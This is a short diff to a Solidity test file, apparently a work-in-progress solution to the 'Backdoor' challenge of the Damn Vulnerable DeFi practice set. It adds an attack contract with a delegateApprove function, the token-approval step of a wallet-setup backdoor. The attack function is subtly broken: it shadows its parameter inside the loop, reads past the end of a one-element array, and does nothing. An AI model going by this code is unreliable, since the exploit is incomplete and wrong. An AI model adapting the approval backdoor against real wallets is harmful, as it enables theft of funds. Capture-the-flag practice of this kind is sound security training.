@@ -96,5 +96,15 @@ contract BackdoorChallenge is Test {
 }
 
 contract AttackBackdoor {
-    
+    DamnValuableToken token;
+    function delegateApprove(address _spender) external {
+        token.approve(_spender, 10 ether);
+    }
+
+    function attack(address[] memory beneficiaries) external {
+        for (uint256 i = 0; i < 4; i++) {
+            address[] memory beneficiaries = new address[](1);
+            beneficiaries[0] = beneficiaries[1];
+        }
+    }
 }
